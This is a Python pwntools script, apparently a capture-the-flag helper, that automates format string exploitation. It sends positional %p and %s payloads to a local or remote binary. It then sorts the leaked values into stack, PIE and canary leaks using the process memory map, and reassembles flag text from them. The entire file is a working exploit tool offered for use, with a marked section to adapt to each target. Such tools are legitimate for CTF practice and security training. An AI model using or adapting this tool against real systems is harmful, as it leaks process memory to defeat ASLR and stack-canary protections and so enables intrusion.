#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import argparse
import sys



def print_banner(title=""):
    print(colored ("""


 .d8888b.  888     888     888 8888888888 .d8888b.  
d88P  Y88b 888     888     888 888       d88P  Y88b 
888    888 888     888     888 888       Y88b.      
888        888     888     888 8888888    "Y888b.   
888  88888 888     888     888 888           "Y88b. 
888    888 888     888     888 888             "888 
Y88b  d88P 888     Y88b. .d88P 888       Y88b  d88P 
 "Y8888P88 88888888 "Y88888P"  888        "Y8888P"  

				By: DiegoAlt4
""",'green'))
    total_len = 62


if __name__ == "__main__":
	
	print_banner()

	parser = argparse.ArgumentParser(description="Tool to identify leaks using format string vulnerability.")

	parser.add_argument('-b', action="store", dest="binary", required=True, help="Set the binary you wish to exploit.")
	parser.add_argument('-max', action="store", dest="max", required=False, help="Set the maximum value to be tested. Range: (min, max).")
	parser.add_argument('-min', action="store", dest="min", required=False, help="Set the minimum value to be tested. Range: (min, max).")
	parser.add_argument('-ip', action="store", dest="ip", required=False, help="remote server's ip.")
	parser.add_argument('-port', action="store", dest="port", required=False, help="remote server's port.")
	parser.add_argument('-flag', action="store", dest="flag_format", required=False, help="indicate the start of the flag.")
	parser.add_argument('--s', action="store_true", dest="format_s", required=False, help="""use %%s instead of %%p.""")
	parser.add_argument('--canary', action="store_true", dest="canary", required=False, help="Find the position in which a canary leak is.")	
	parser.add_argument('--leaks', action="store_true", dest="all_leaks", required=False, help="Prints all leaks found.")
	parser.add_argument('--pie', action="store_true", dest="pie_search", required=False, help="Find the position of a pie leak.")
	parser.add_argument('--stack', action="store_true", dest="stack_search", required=False, help="Find the position of a stack leak.")
	parser.add_argument('--v', action="store_true", dest="verbose", required=False, help="Set the verbose mode.")



	results = parser.parse_args() 	

	file = context.binary = results.binary
	elf = ELF(file)

	if (results.format_s == True):
		assert ((results.format_s != results.canary) and (results.format_s != results.all_leaks)), "Remember that you can only use the -s parameter to search for flags. You cannot add --canary or --leaks."

	max = 40 ## Default value
	min = 1 ## Default value

	if results.flag_format is not None:

		flagB = False
		flag = ""
		value = int(elf.elfclass / 8)
		flagS = (results.flag_format[:value]).encode()

	if results.max is not None:

		log.info("Setting the maximum value to " + str(results.max))	
		max = int(results.max) + 1

	if results.min is not None:

		log.info("Setting the minimun value to " + str(results.min))	
		min = int(results.min)

	for i in range (min, max):

		if (results.ip is not None and results.port is not None):
			
			p = remote(results.ip, results.port)

		else:

			p = process(elf.path)


		if (results.format_s == False):

			# We will use %p as the format
			payload = '%{}$p'.format(i).encode()


			#######################################################################
			#      This is the part that you must modify to fit your binary.      #
	        #######################################################################
			#
			p.sendlineafter(b'streak?', payload)	
			p.recvuntil(b'current streak:')
			# p.sendlineafter(b'>>', payload)
			# p.recvuntil(b'-')
			#leak = p.recv().strip(b'\n')
			leak = p.recvuntil(b'\n').strip(b'\n')
			# print(leak)
			#
			#######################################################################		

			if not b'nil' in leak:

				try:

					leak = int(leak, 16)
					print("=========================================================")
					log.info(str(i) + " round")
					leak_str = hex(leak).strip('\n')

					if (results.all_leaks == True):

						log.success(f"leak: 0x{leak:x}")

					if (results.stack_search == True or results.pie_search == True):

						mappings = open("/proc/{}/maps".format(p.pid)).read().split()

						for j in range(len (mappings)):

							# print (mappings)

							if (results.stack_search == True):

								if mappings[j] == "[stack]":

									stack_range = mappings[j-5].split('-')
									stack_min_hex = "0x" + stack_range[0]
									stack_max_hex = "0x" + stack_range[1]
									
									stack_min = int(stack_min_hex, 16)
									stack_max = int(stack_max_hex, 16)

									if (stack_max >= leak and stack_min <= leak):

										log.success(colored(f"leak: 0x{leak:x}", "blue"))

										log.success(colored("Possible stack leak found with payload: " + payload.decode(), "red"))
										
										if (results.verbose == True):

											print("Min: " + str(stack_min_hex))
											print("Max: " + str(stack_max_hex))	
											
					
						if (results.pie_search == True):


							binario = results.binary.split('/')[-1]
							k = 0

							while (k < len(mappings)):

								if (binario in mappings[k + 5]):

									k+=6

								else:

									break

							pie_min_hex = "0x" + mappings[0].split('-')[0]
							pie_max_hex = "0x" + mappings[k-6].split('-')[1]
							pie_min = int(pie_min_hex, 16)
							pie_max = int(pie_max_hex, 16)


							if (pie_max >= leak and pie_min <= leak):

								log.success(colored(f"leak: 0x{leak:x}", "blue"))
								log.success(colored("Possible pie leak found with payload: " + payload.decode(), "red"))
										
								if (results.verbose == True):

									print("Min: " + str(pie_min_hex))
									print("Max: " + str(pie_max_hex))

					if (results.flag_format is not None):

						try:
						
							decoded = unhex(leak_str.strip()[2:])
							reversed_hex = decoded[::-1]
							# print(reversed_hex)

							if flagS in reversed_hex or flagB == True:

								print(colored(reversed_hex, "blue"))
								flag+=str(reversed_hex).strip("b").strip("'")
								log.info(colored("Flag: " + flag, "red"))
								flagB = True

								if (b'}' in reversed_hex):

									flagB = False

									if (results.all_leaks is False) and (results.canary is False):

										break							

						except BaseException:

							pass
				
					if (results.canary == True):

						if ((leak & 0xff) == 0 and elf.elfclass == (len(leak_str)-2) * 4):
		
							if (results.all_leaks == False):

								log.success(colored(f"leak: 0x{leak:x}", "blue"))

							log.success(colored("Possible canary found with payload: " + payload.decode(), "red"))


				except ValueError:

					pass

			else:

				log.failure("nil found")

			print("=========================================================")
	
		else:

			# We will use %s as the format
			payload = '%{}$s'.format(i).encode()


			#######################################################################
			#      This is the part that you must modify to fit your binary.      #
	        #######################################################################
			#
			p.sendlineafter(b'again?', payload)
			p.recvuntil(b'Welcome back')
			leak = p.recv()
			#
			#######################################################################	
			try:

				if flagS in leak:

					flag=str(leak).strip("b").strip("'")
					log.info(colored("Flag: " + flag, "red"))
					break

			except Exception:

				pass		



		p.close()

